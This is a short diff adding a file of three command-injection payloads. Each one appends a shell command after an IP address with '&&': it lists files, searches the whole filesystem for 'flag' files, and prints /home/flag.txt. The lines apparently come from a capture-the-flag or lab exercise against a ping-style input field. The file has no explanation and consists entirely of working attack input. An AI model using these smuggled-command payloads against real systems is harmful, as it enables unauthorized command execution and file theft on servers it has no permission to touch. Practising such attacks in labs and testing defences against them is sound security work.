@@ -1,0 +1,3 @@
+127.0.0.1 && ls
+127.0.0.1 && find / -name "flag*"
+127.0.0.1 && cat /home/flag.txt
